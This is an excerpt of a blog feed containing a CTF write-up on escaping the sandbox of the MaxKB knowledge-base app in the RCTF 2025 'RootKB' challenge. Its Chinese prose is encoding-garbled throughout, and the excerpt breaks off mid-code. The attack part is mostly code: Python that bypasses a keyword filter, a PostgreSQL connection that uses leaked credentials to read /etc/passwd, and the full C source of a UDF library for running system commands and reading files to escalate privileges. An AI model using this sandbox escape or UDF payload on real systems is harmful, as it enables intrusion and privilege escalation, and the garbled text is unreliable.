    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¢«æˆ‘å¿˜æ‰çš„ Hessian ååºåˆ—åŒ– â€”â€” C1oudfL0w0 ç‰ˆï¼ˆ&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&quot;&gt;https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/&quot;&gt;https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/621596752&quot;&gt;https://zhuanlan.zhihu.com/p/621596752&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/oldersheep/simple-hessian-rpc&quot;&gt;https://github.com/oldersheep/simple-hessian-rpc&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>RCTF 2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/15/RCTF-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/15/RCTF-2025/</id>
    <published>2025-11-15T06:28:18.000Z</published>
    <updated>2026-01-15T08:34:00.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p>n1 çš„ wpï¼š <a href="https://wx.zsxq.com/group/824215518412">https://wx.zsxq.com/group/824215518412</a></p><p>ROIS å®˜æ–¹çš„ wpï¼š <a href="https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/">https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/</a></p><p>SU çš„ wpï¼š <a href="https://su-team.cn/post/rctf-2025-su-wu/">https://su-team.cn/post/rctf-2025-su-wu/</a></p><span id="more"></span><hr><h1 id="RootKBï¼ˆå¤ç°ï¼‰"><a href="#RootKBï¼ˆå¤ç°ï¼‰" class="headerlink" title="RootKBï¼ˆå¤ç°ï¼‰"></a>RootKBï¼ˆå¤ç°ï¼‰</h1><p>Try to root myÂ <a href="https://github.com/1Panel-dev/MaxKB/tree/v2">MaxKB</a>.</p><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> 1panel/maxkb:v2.3.1</span><span class="token instruction"><span class="token keyword">COPY</span> flag /root/flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œæ‰“å¼€é¡¹ç›®å¯ä»¥çœ‹åˆ°å‡ ä¸ªæ–°å‡ºçš„ CVEï¼š<a href="https://github.com/1Panel-dev/MaxKB/security/advisories/GHSA-9287-g7px-9rp4">CVE-2025-64511</a>ï¼Œ<a href="https://github.com/1Panel-dev/MaxKB/security/advisories/GHSA-qwvm-x4xh-g2qq">CVE-2025-64703</a></p><p>ç”Ÿæ•ˆç‰ˆæœ¬æ˜¯ 2.3.0 åŠä¹‹å‰ï¼Œå¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªç‰ˆæœ¬çš„æºç ï¼š<a href="https://github.com/1Panel-dev/MaxKB/compare/v2.3.0...v2.3.1">https://github.com/1Panel-dev/MaxKB/compare/v2.3.0...v2.3.1</a></p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251115145642671.png"></p><p>å…³é”®å­—çš„è¿‡æ»¤å¾ˆå¥½ç»•è¿‡ï¼Œå°è¯•ç›´æ¥æ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># return os.popen('env')</span>    b <span class="token operator">=</span> subprocess    <span class="token keyword">return</span> b<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼šå‘ç°è¿ sh éƒ½æ²¡æƒé™ç”¨</p><p>å…ˆçœ‹çœ‹ sandbox ç¯å¢ƒå˜é‡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># return os.popen('env')</span>    <span class="token comment"># b = subprocess</span>    <span class="token comment"># return b.call('env')</span>    <span class="token keyword">return</span> os<span class="token punctuation">.</span>environ    <span class="token comment"># environ(&#123;'LD_PRELOAD': '/opt/maxkb-app/sandbox/sandbox.so', 'HOME': '/opt/maxkb-app/sandbox', 'SHELL': '/opt/py3/bin/python', 'USER': 'sandbox', 'LOGNAME': 'sandbox', 'MAIL': '/var/mail/sandbox', 'LC_CTYPE': 'C.UTF-8'&#125;)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pgsql-getshellï¼ˆno-rootï¼‰"><a href="#pgsql-getshellï¼ˆno-rootï¼‰" class="headerlink" title="pgsql getshellï¼ˆno rootï¼‰"></a>pgsql getshellï¼ˆno rootï¼‰</h2><p>é…ç½®é‡Œé¢æœ‰æ•°æ®åº“çš„å¯†ç ï¼Œæµ‹è¯•å‘ç°å¯ä»¥ç”¨ pgsql æ¥è·³å‡ºæ²™ç›’ï¼Œredis æ²¡æ³•ä¿®æ”¹ config</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>socket<span class="token punctuation">,</span>shutil<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>gc<span class="token punctuation">,</span>time<span class="token punctuation">,</span>redis<span class="token punctuation">,</span>psycopg2<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># r = redis.Redis('0.0.0.0',6379,password='Password123@redis')</span>    <span class="token comment"># return r.config_set('dir','/opt/maxkb-app/sandbox/execute')</span>    conn <span class="token operator">=</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>database<span class="token operator">=</span><span class="token string">"postgres"</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"Password123@postgres"</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">"5432"</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select pg_read_file(\'/etc/passwd\');'</span><span class="token punctuation">)</span>    rows <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251116022026884.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- PostgreSQL 17.6 (Debian 17.6-2.pgdg13+1) on aarch64-unknown-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> pg_language<span class="token punctuation">;</span><span class="token comment">-- internal, c, sql, plpgsql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•æœ¬åœ°ç¼–è¯‘ pg17 çš„ udf.so è¿›è¡Œææƒï¼Œå‚è€ƒ <a href="https://r0fus0d.blog.ffffffff0x.com/post/postgresql-pentest/#cve-2019-9193-postgresql-%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://r0fus0d.blog.ffffffff0x.com/post/postgresql-pentest/#cve-2019-9193-postgresql-%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E</a></p><p>evil.cï¼š <a href="https://github.com/Ape1ron/davinci/blob/29eec71780150adfa50e0e7751ba1782acfeed2f/lib/postgresql/eval_16.c">https://github.com/Ape1ron/davinci/blob/29eec71780150adfa50e0e7751ba1782acfeed2f/lib/postgresql/eval_16.c</a></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* lib_postgresqludf_sys - a library with miscellaneous (operating) system level functionsCopyright (C) 2009-2010  Bernardo Damele A. G.web: http://bernardodamele.blogspot.com/email: bernardo.damele@gmail.comThis library is free software; you can redistribute it and/ormodify it under the terms of the GNU Lesser General PublicLicense as published by the Free Software Foundation; eitherversion 2.1 of the License, or (at your option) any later version.This library is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNULesser General Public License for more details.You should have received a copy of the GNU Lesser General PublicLicense along with this library; if not, write to the Free SoftwareFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>_WIN32<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>_WIN64<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>__WIN32__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>WIN32<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_USE_32BIT_TIME_T</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DLLEXP</span> <span class="token expression"><span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUILDING_DLL</span> <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DLLEXP</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;postgres.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fmgr.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>_WIN32<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>_WIN64<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>__WIN32__<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">defined</span><span class="token punctuation">(</span>WIN32<span class="token punctuation">)</span></span></span>DWORD WINAPI <span class="token function">exec_payload</span><span class="token punctuation">(</span>LPVOID lpParameter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PG_MODULE_MAGIC</span></span>PG_MODULE_MAGIC<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>text <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>retVal<span class="token punctuation">;</span><span class="token keyword">int</span> arg_size <span class="token operator">=</span> <span class="token function">VARSIZE</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">-</span> VARHDRSZ<span class="token punctuation">;</span>retVal <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>arg_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memcpy</span><span class="token punctuation">(</span>retVal<span class="token punctuation">,</span> <span class="token function">VARDATA</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">,</span> arg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>retVal<span class="token punctuation">[</span>arg_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">return</span> retVal<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>text <span class="token operator">*</span><span class="token function">chr_ptr_to_text_ptr</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>text <span class="token operator">*</span>retVal<span class="token punctuation">;</span>retVal <span class="token operator">=</span> <span class="token punctuation">(</span>text <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>VARHDRSZ <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">SET_VARSIZE</span></span><span class="token function">SET_VARSIZE</span><span class="token punctuation">(</span>retVal<span class="token punctuation">,</span> VARHDRSZ <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token function">VARATT_SIZEP</span><span class="token punctuation">(</span>retVal<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">+</span> VARHDRSZ<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token function">VARDATA</span><span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">,</span> arg<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> retVal<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">PG_FUNCTION_INFO_V1</span><span class="token punctuation">(</span>sys_exec<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PGDLLIMPORT</span></span><span class="token keyword">extern</span> PGDLLIMPORT Datum <span class="token function">sys_exec</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">extern</span> DLLIMPORT Datum <span class="token function">sys_exec</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>text <span class="token operator">*</span>argv0 <span class="token operator">=</span> <span class="token function">PG_GETARG_TEXT_P</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>int32 result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">;</span>command <span class="token operator">=</span> <span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*Only if you want to logelog(NOTICE, "Command execution: %s", command);*/</span>result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_FREE_IF_COPY</span><span class="token punctuation">(</span>argv0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_INT32</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">PG_FUNCTION_INFO_V1</span><span class="token punctuation">(</span>sys_eva<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PGDLLIMPORT</span></span><span class="token keyword">extern</span> PGDLLIMPORT Datum <span class="token function">sys_eva</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">extern</span> DLLIMPORT Datum <span class="token function">sys_eva</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>text <span class="token operator">*</span>argv0 <span class="token operator">=</span> <span class="token function">PG_GETARG_TEXT_P</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>text <span class="token operator">*</span>result_text<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span>FILE <span class="token operator">*</span>pipe<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>line<span class="token punctuation">;</span>int32 outlen<span class="token punctuation">,</span> linelen<span class="token punctuation">;</span>command <span class="token operator">=</span> <span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*Only if you want to logelog(NOTICE, "Command evaluated: %s", command);*/</span>line <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>outlen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">;</span>pipe <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> pipe<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>linelen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> outlen <span class="token operator">+</span> linelen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>result <span class="token operator">+</span> outlen<span class="token punctuation">,</span> line<span class="token punctuation">,</span> linelen<span class="token punctuation">)</span><span class="token punctuation">;</span>outlen <span class="token operator">=</span> outlen <span class="token operator">+</span> linelen<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pclose</span><span class="token punctuation">(</span>pipe<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>result<span class="token punctuation">[</span>outlen<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>result_text <span class="token operator">=</span> <span class="token function">chr_ptr_to_text_ptr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_POINTER</span><span class="token punctuation">(</span>result_text<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">PG_FUNCTION_INFO_V1</span><span class="token punctuation">(</span>sys_fileread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">PGDLLIMPORT</span></span><span class="token keyword">extern</span> PGDLLIMPORT Datum <span class="token function">sys_fileread</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token keyword">extern</span> DLLIMPORT Datum <span class="token function">sys_fileread</span><span class="token punctuation">(</span>PG_FUNCTION_ARGS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>text <span class="token operator">*</span>argv0 <span class="token operator">=</span> <span class="token function">PG_GETARG_TEXT_P</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>text <span class="token operator">*</span>result_text<span class="token punctuation">;</span>int32 len<span class="token punctuation">;</span>int32 i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">;</span><span class="token keyword">char</span> table<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0123456789ABCDEF"</span><span class="token punctuation">;</span>FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>filename <span class="token operator">=</span> <span class="token function">text_ptr_to_char_ptr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span>file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">PG_RETURN_NULL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fseek</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span>len <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fseek</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>buffer<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_NULL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>result<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> table<span class="token punctuation">[</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">]</span><span class="token punctuation">;</span>result<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> table<span class="token punctuation">[</span> buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>   <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>result<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>result_text <span class="token operator">=</span> <span class="token function">chr_ptr_to_text_ptr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PG_RETURN_POINTER</span><span class="token punctuation">(</span>result_text<span 